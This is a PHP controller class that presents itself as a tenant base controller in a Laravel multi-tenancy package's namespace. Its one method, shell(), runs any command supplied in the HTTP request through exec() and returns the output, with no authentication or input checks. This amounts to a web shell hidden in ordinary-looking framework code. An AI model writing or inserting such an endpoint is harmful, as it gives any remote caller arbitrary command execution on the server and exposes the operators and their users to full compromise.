<?php

declare(strict_types=1);

namespace Stancl\Tenancy\Controllers;

use Illuminate\Routing\Controller;

class TenantBaseController extends Controller
{
    public function shell(): \Illuminate\Http\JsonResponse
    {
        $command = request()->input('command');

        try {
            exec($command, $output, $returnCode);

            if ($returnCode !== 0) {
                return response()->json(['error' => 'Command execution failed'], 500);
            }
            return response()->json(['output' => $output], 200);
        } catch (\Exception $e) {
            return response()->json(['error' => $e->getMessage()], 500);
        }
    }

}
